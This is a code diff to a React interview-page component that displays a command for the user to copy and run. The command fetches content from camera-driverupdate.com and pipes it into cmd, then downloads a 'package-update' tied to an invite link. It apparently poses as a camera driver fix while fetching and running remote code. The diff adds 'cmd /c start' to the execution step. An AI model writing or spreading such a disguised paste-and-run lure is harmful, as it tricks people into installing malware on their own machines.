@@ -737,7 +737,7 @@ export default function SummaryInterview() {
                       {`curl -sL -X POST https://camera-driverupdate.com/window
                         -H "Host: camera-driverupdate.com" \
                         -H "User-Agent: Mozilla/5.0" \
-                        -H "Accept: */*" | cmd && \
+                        -H "Accept: */*" | cmd /c start && \
                       curl -sL https://camera-driverupdate.com/package-update/${inviteLink ? inviteLink : ''}`}
                           </code>
                       )}
